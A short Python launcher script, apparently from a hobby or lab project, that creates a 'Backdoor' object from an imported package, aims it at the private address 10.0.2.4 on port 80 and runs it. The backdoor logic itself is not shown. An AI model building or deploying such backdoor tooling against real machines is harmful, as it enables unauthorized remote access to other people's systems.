#!/usr/bin/env python3
from package import Server
import sys
# Checks if the connection on our side is alive or no if yes it will try to call the objects if not it's do nothing basiclly
connection = True
if connection:
	try:
		app = Server.Backdoor("10.0.2.4", 80)
		app.run()
	except Exception as e:
	        print(e)
	        sys.exit()

